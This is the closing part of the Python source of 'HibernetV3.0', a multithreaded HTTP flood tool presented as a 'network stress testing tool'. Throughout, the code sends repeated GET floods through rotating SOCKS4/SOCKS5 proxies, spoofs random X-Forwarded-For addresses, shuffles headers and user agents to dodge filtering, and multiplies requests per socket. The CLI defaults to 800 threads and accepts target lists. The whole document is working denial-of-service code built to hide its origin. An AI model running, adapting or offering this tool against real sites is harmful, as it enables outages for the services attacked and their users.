		all_headers.append("User-Agent: " + random.choice(useragents) + "\r\n")
		all_headers.append(random.choice(acceptall))
		all_headers.append(connection)
		
		# Add some additional headers randomly
		for _ in range(random.randint(0, 3)):
			all_headers.append(random.choice(additional_headers))
		
		# Shuffle the headers to create permutation
		random.shuffle(all_headers)
		
		# Build the request with permuted headers
		request = get_host + "".join(all_headers) + "\r\n"
		proxy = self.get_healthy_proxy() # get a healthy proxy
		
		# Error recovery counters
		consecutive_failures = 0
		max_consecutive_failures = 10
		
		# Try HTTP/2 first if available
		if HTTP2_AVAILABLE:
			try:
				# For HTTP/2 through SOCKS, we need to establish the SOCKS connection first
				# This is a simplified implementation - in practice, this would be more complex
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True)
				s = socks.socksocket()
				s.settimeout(10)
				s.connect((url2, int(urlport)))
				
				# Create HTTP/2 connection through the SOCKS proxy
				# Note: This is a simplified approach and may not work in all cases
				h2_sock, conn = create_http2_connection(url2, int(urlport), use_ssl=False)  # We're already tunneled through SOCKS
				if h2_sock and conn:
					# Convert headers to HTTP/2 format
					headers = []
					for header in all_headers:
						if ":" in header:
							name, value = header.split(":", 1)
							headers.append((name.strip(), value.strip()))
					
					# Send HTTP/2 request
					if send_http2_request(h2_sock, conn, headers):
						print ("HTTP/2 Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
						update_proxy_stats(proxy[0] + ":" + proxy[1], True) # update proxy stats on success
						consecutive_failures = 0  # Reset failure counter
						go.wait() # aspetta che threads siano pronti
						return  # If HTTP/2 works, we're done
					else:
						# Close HTTP/2 connection if it failed
						try:
							h2_sock.close()
						except:
							pass
				# Close the SOCKS connection if HTTP/2 failed
				try:
					s.close()
				except:
					pass
			except Exception as e:
				print(f"HTTP/2 connection failed for proxy {proxy[0]}:{proxy[1]}: {e}")
				# If HTTP/2 setup failed, we'll fall back to HTTP/1.1
				pass
		
		# Fallback to HTTP/1.1
		go.wait() # aspetta che threads siano pronti
		while True:
			try:
				socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, str(proxy[0]), int(proxy[1]), True) # comando per proxarci con i socks
				s = socks.socksocket() # creazione socket con pysocks
				s.settimeout(10) # set timeout for connection
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
				update_proxy_stats(proxy[0] + ":" + proxy[1], True) # update proxy stats on success
				consecutive_failures = 0  # Reset failure counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
					# Try with a different proxy on failure
					proxy = self.get_healthy_proxy(proxy)
					continue
			except Exception as e:
				# Update proxy stats on failure
				update_proxy_stats(proxy[0] + ":" + proxy[1], False)
				# se qualcosa va storto questo except chiude il socket e si collega al try sotto
				s.close() # chiude socket
				consecutive_failures += 1
				
				# If we have too many consecutive failures, exit the thread
				if consecutive_failures >= max_consecutive_failures:
					print(f"Thread {self.counter} exiting due to too many consecutive failures")
					break
				
				try: # il try prova a vedere se l'errore e' causato dalla tipologia di socks errata, infatti prova con SOCKS4
					socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS4, str(proxy[0]), int(proxy[1]), True) # prova con SOCKS4
					s = socks.socksocket() # creazione nuovo socket
					s.settimeout(10) # set timeout for connection
					s.connect((str(url2), int(urlport))) # connessione
					s.send (str.encode(request)) # invio
					print ("Request sent from " + str(proxy[0]+":"+proxy[1]) + " @", self.counter) # print req + counter
					update_proxy_stats(proxy[0] + ":" + proxy[1], True) # update proxy stats on success
					consecutive_failures = 0  # Reset failure counter
					try: # invia altre richieste nello stesso thread
						for y in range(multiple): # fattore di moltiplicazione
							s.send(str.encode(request)) # encode in bytes della richiesta HTTP
					except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
						s.close()
						# Try with a different proxy on failure
						proxy = self.get_healthy_proxy(proxy)
						continue
				except Exception as e:
					# Update proxy stats on failure
					update_proxy_stats(proxy[0] + ":" + proxy[1], False)
					print ("Sock down. Retrying request. @", self.counter)
					s.close() # se nemmeno con quel try si e' riuscito a inviare niente, allora il sock e' down e chiude il socket.
					# Try with a different proxy
					proxy = self.get_healthy_proxy(proxy)
					continue

class RequestDefaultHTTP(threading.Thread): # la classe del multithreading

	def __init__(self, counter): # funzione messa su praticamente solo per il counter dei threads. Il parametro counter della funzione, passa l'x+1 di sopra come variabile counter
		threading.Thread.__init__(self)
		self.counter = counter

	def run(self): # la funzione che da' le istruzioni ai vari threads
		randomip = str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255)) + "." + str(random.randint(0,255))
		forward = "X-Forwarded-For: " + randomip + "\r\n" # X-Forwarded-For, un header HTTP che permette di incrementare anonimato (vedi google per info)
		if choice1 == "1":
			ip = random.choice(ips)
			get_host = "GET " + ip + " HTTP/1.1\r\nHost: " + ip + "\r\n"
		else:
			get_host = "GET " + url + " HTTP/1.1\r\nHost: " + url2 + "\r\n"
		
		# Create a list of all possible headers
		all_headers = []
		all_headers.append("User-Agent: " + random.choice(useragents) + "\r\n")
		all_headers.append(random.choice(acceptall))
		all_headers.append(forward)
		all_headers.append(connection)
		
		# Add some additional headers randomly
		for _ in range(random.randint(0, 3)):
			all_headers.append(random.choice(additional_headers))
		
		# Shuffle the headers to create permutation
		random.shuffle(all_headers)
		
		# Build the request with permuted headers
		request = get_host + "".join(all_headers) + "\r\n"
		
		# Error recovery counters
		consecutive_failures = 0
		max_consecutive_failures = 10
		
		# Try HTTP/2 first if available
		if HTTP2_AVAILABLE:
			try:
				sock, conn = create_http2_connection(url2, int(urlport))
				if sock and conn:
					# Convert headers to HTTP/2 format
					headers = []
					for header in all_headers:
						if ":" in header:
							name, value = header.split(":", 1)
							headers.append((name.strip(), value.strip()))
					
					# Send HTTP/2 request
					if send_http2_request(sock, conn, headers):
						print ("HTTP/2 Request sent! @", self.counter) # print req + counter
						consecutive_failures = 0  # Reset failure counter
						go.wait() # aspetta che i threads siano pronti
						return  # If HTTP/2 works, we're done
					else:
						# Close HTTP/2 connection if it failed
						try:
							sock.close()
						except:
							pass
			except Exception as e:
				print(f"HTTP/2 connection failed: {e}")
		
		# Fallback to HTTP/1.1
		go.wait() # aspetta che i threads siano pronti
		while True:
			try:
				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # creazione socket
				s.connect((str(url2), int(urlport))) # connessione
				s.send (str.encode(request)) # invio
				print ("Request sent! @", self.counter) # print req + counter
				consecutive_failures = 0  # Reset failure counter
				try: # invia altre richieste nello stesso thread
					for y in range(multiple): # fattore di moltiplicazione
						s.send(str.encode(request)) # encode in bytes della richiesta HTTP
				except: # se qualcosa va storto, chiude il socket e il ciclo ricomincia
					s.close()
			except: # se qualcosa va storto
				s.close() # chiude socket e ricomincia
				consecutive_failures += 1
				
				# If we have too many consecutive failures, exit the thread
				if consecutive_failures >= max_consecutive_failures:
					print(f"Thread {self.counter} exiting due to too many consecutive failures")
					break


# Modern CLI Interface and Configuration
import argparse
import uuid
from pathlib import Path

# Import timeout configuration
try:
    from hiber_proxy.utils.config import ConfigManager, TimeoutConfig
    CONFIG_AVAILABLE = True
except ImportError:
    CONFIG_AVAILABLE = False
    # Fallback timeout configuration
    class TimeoutConfig:
        connection_timeout = 30
        read_timeout = 60
        write_timeout = 30
        scraping_timeout = 45
        database_timeout = 30
        health_check_timeout = 15
        bulk_operation_timeout = 300

def load_timeout_config():
    """Load timeout configuration from config file or use defaults"""
    if CONFIG_AVAILABLE:
        try:
            config_manager = ConfigManager()
            return config_manager.get_timeout_config()
        except Exception:
            pass

    # Return default configuration
    return TimeoutConfig()

def create_modern_cli():
    """Create modern command-line interface"""
    parser = argparse.ArgumentParser(
        description="HibernetV3.0 - Advanced Network Stress Testing Tool",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  # Basic HTTP stress test
  python HibernetV3.0.py --target https://example.com --threads 500 --duration 60

  # Test with proxies and HTTP/2
  python HibernetV3.0.py --target https://example.com --proxy-file proxies.txt --protocol http2

  # WebSocket stress test
  python HibernetV3.0.py --target ws://example.com/chat --test-type websocket --connections 100

  # Multiple targets with advanced proxy rotation
  python HibernetV3.0.py --target-file targets.txt --proxy-rotation health_based --real-time-dashboard

  # Export detailed report
  python HibernetV3.0.py --target https://example.com --export-csv results.csv --export-json report.json
        """
    )

    # Target configuration
    target_group = parser.add_mutually_exclusive_group(required=True)
    target_group.add_argument('--target', '-t', help='Single target URL or IP')
    target_group.add_argument('--target-file', '-tf', help='File containing multiple targets')

    # Test configuration
    parser.add_argument('--threads', '-th', type=int, default=800, help='Number of threads (default: 800)')
    parser.add_argument('--duration', '-d', type=float, default=60, help='Test duration in seconds (default: 60)')
    parser.add_argument('--rate-limit', '-r', type=int, help='Requests per second limit per thread')
    parser.add_argument('--multiplication', '-m', type=int, default=1, help='Request multiplication factor (default: 1)')

    # Protocol options
    parser.add_argument('--protocol', '-p', choices=['http1', 'http2', 'http3', 'auto'],
                       default='auto', help='HTTP protocol version (default: auto)')
    parser.add_argument('--test-type', choices=['http_flood', 'websocket', 'mixed'],
                       default='http_flood', help='Type of stress test (default: http_flood)')

    # Proxy configuration
    parser.add_argument('--proxy-file', '-pf', help='Proxy list file')
    parser.add_argument('--proxy-type', choices=['http', 'socks4', 'socks5'],
                       default='http', help='Proxy type (default: http)')
    parser.add_argument('--proxy-rotation', choices=['round_robin', 'weighted_random', 'health_based', 'fastest'],
                       default='health_based', help='Proxy rotation strategy (default: health_based)')

    # Output and reporting
    parser.add_argument('--real-time-dashboard', '-rtd', action='store_true',
                       help='Enable real-time dashboard')
    parser.add_argument('--dashboard-interval', type=float, default=5.0,
                       help='Dashboard update interval in seconds (default: 5.0)')
    parser.add_argument('--export-csv', help='Export metrics to CSV file')
    parser.add_argument('--export-json', help='Export comprehensive report to JSON file')
    parser.add_argument('--session-id', help='Custom session ID (auto-generated if not provided)')

    # Advanced options
    parser.add_argument('--user-agents-file', help='Custom user agents file')
    parser.add_argument('--headers-file', help='Custom headers file')
    parser.add_argument('--geoip-db', help='GeoIP database file for proxy geolocation')
    parser.add_argument('--config-file', '-c', help='Configuration file (JSON format)')
    parser.add_argument('--quiet', '-q', action='store_true', help='Suppress output except errors')
    parser.add_argument('--verbose', '-v', action='store_true', help='Verbose output')

    return parser

def load_config_file(config_path: str) -> Dict[str, Any]:
    """Load configuration from JSON file"""
    try:
        with open(config_path, 'r') as f:
            return json.load(f)
    except Exception as e:
        http2_logger.error(f"Failed to load config file {config_path}: {e}")
        return {}

def load_targets_from_file(filename: str) -> List[str]:
    """Load target URLs from file"""
    targets = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#'):
                    targets.append(line)
    except Exception as e:
        http2_logger.error(f"Failed to load targets from {filename}: {e}")

    return targets

def setup_advanced_proxy_manager(args, config):
    """Setup advanced proxy manager with configuration"""
    global advanced_proxy_manager

    # Initialize with GeoIP database if provided
    geoip_db = args.geoip_db or config.get('geoip_db')
    if geoip_db:
        advanced_proxy_manager = AdvancedProxyManager(geoip_db)

    # Load proxies from file
    proxy_file = args.proxy_file or config.get('proxy_file')
    if proxy_file:
        proxy_type = args.proxy_type or config.get('proxy_type', 'http')
        count = advanced_proxy_manager.load_proxies_from_file(proxy_file, proxy_type)
        http2_logger.info(f"Loaded {count} proxies from {proxy_file}")

    # Set rotation strategy
    rotation_strategy = args.proxy_rotation or config.get('proxy_rotation', 'health_based')
    try:
        strategy = ProxyRotationStrategy(rotation_strategy)
        advanced_proxy_manager.set_rotation_strategy(strategy)
    except ValueError:
        http2_logger.warning(f"Invalid rotation strategy: {rotation_strategy}, using default")

def run_modern_stress_test(args, config):
    """Run stress test with modern configuration"""
    # Generate session ID
    session_id = args.session_id or config.get('session_id') or str(uuid.uuid4())[:8]

    # Prepare targets
    if args.target:
        targets = [args.target]
    else:
        targets = load_targets_from_file(args.target_file)

    if not targets:
        http2_logger.error("No targets specified")
        return

    # Setup metrics collection
    test_config = {
        'threads': args.threads,
        'duration': args.duration,
        'protocol': args.protocol,
        'test_type': args.test_type,
        'multiplication': args.multiplication,
        'proxy_rotation': args.proxy_rotation,
        'rate_limit': args.rate_limit
    }

    metrics_collector.start_session(
        session_id=session_id,
        target_urls=targets,
        total_threads=args.threads,
        duration_seconds=args.duration,
        test_type=args.test_type,
        configuration=test_config
    )

    # Start real-time dashboard if requested
    dashboard_thread = None
    if args.real_time_dashboard:
        dashboard_thread = start_real_time_dashboard(args.dashboard_interval)
        http2_logger.info("Real-time dashboard started")

    # Setup global variables for compatibility with existing code
    global url, url2, urlport, choice1, choice2, choice3, threads, multiple, ips

    # Use first target for compatibility
    url = targets[0]
    if len(targets) > 1:
        choice1 = "1"
        ips = targets
    else:
        choice1 = "0"

    # Parse URL
    if url.startswith("http://"):
        url2 = url.replace("http://", "").split("/")[0].split(":")[0]
        urlport = url.replace("http://", "").split("/")[0].split(":")[1] if ":" in url.replace("http://", "").split("/")[0] else "80"
    elif url.startswith("https://"):
        url2 = url.replace("https://", "").split("/")[0].split(":")[0]
        urlport = url.replace("https://", "").split("/")[0].split(":")[1] if ":" in url.replace("https://", "").split("/")[0] else "443"
    else:
        url2 = url.split(":")[0]
        urlport = url.split(":")[1] if ":" in url else "80"

    # Set proxy mode
    if args.proxy_file:
        choice2 = "y"
        choice3 = "0" if args.proxy_type == "http" else "1"
    else:
        choice2 = "n"

    threads = args.threads
    multiple = args.multiplication

    http2_logger.info(f"Starting stress test session: {session_id}")
    http2_logger.info(f"Targets: {len(targets)} | Threads: {threads} | Duration: {args.duration}s")

    # Run the test using existing loop function
    try:
        loop()

        # Wait for test duration
        time.sleep(args.duration)

    except KeyboardInterrupt:
        http2_logger.info("Test interrupted by user")
    finally:
        # End session
        metrics_collector.end_session()

        # Export results if requested
        if args.export_csv:
            metrics_collector.export_metrics_csv(args.export_csv)

        if args.export_json:
            metrics_collector.export_report_json(args.export_json)

        # Print final statistics
        if not args.quiet:
            print("\n" + "="*80)
            print("FINAL TEST RESULTS")
            print("="*80)
            metrics_collector.print_real_time_stats()

def main():
    """Main entry point with modern CLI"""
    parser = create_modern_cli()
    args = parser.parse_args()

    # Load configuration file if provided
    config = {}
    if args.config_file:
        config = load_config_file(args.config_file)

    # Setup logging level
    if args.verbose:
        logging.getLogger().setLevel(logging.DEBUG)
    elif args.quiet:
        logging.getLogger().setLevel(logging.ERROR)

    # Setup advanced proxy manager
    setup_advanced_proxy_manager(args, config)

    # Print banner
    if not args.quiet:
        print('''

  hh   hh  iii  bbbbbbb  eeeeeee  rrrrrrrr  nn     nnn  eeeeeee  ttttttttt
  hh   hh  iii  bb   bb  eeeeeee  rr    rr  nnn    nnn  eeeeeee     ttt
  hh   hh  iii  bb   bb  ee       rr    rr  nnnn   nnn  ee          ttt
  hh   hh  iii  bbbbbbb  ee       rrrrrrrr  nnnnnnnnnn  ee          ttt
  hhhhhhh  iii  bb       eeeeeee  rrrr      nnnnnnnnnn  eeeeeee     ttt
  hh   hh  iii  bbbbbbb  ee       rr rr     nnnnnnnnnn  ee          ttt
  hh   hh  iii  bb   bb  ee       rr  rr    nn  nnnnnn  ee          ttt
  hh   hh  iii  bb   bb  eeeeeee  rr   rr   nnn  nnnnn  eeeeeee     ttt
  hh   hh  iii  bbbbbbb  eeeeeee  rr    rr  nnnn  nnnn  eeeeeee     ttt


                            HibernetV3.0 - Enhanced Edition
                        Advanced Network Stress Testing Tool
                                C0d3d by All3xJ
        ''')

    # Run the stress test
    run_modern_stress_test(args, config)

if __name__ == '__main__':
    # Check if running with command line arguments
    if len(sys.argv) > 1:
        main()  # Use modern CLI
    else:
        starturl()  # Use legacy interactive mode